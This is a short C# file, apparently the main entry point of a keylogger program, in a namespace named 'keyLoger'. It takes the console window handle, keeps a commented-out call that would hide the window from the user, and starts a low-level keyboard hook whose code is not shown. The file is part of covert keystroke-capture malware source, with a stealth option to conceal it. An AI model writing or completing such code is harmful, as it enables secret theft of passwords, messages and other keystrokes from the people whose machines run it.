namespace keyLoger
{
    static class Program
    {
        const int SW_HIDE = 0; // hide console
        static void Main(string[] args)
        {
            var handle = User32.GetConsoleWindow();
           // User32.ShowWindow(handle, SW_HIDE);  // to hide the running application
            KeyLoger.IntializeLL_KEYBOARDHook();
        }
    }
}
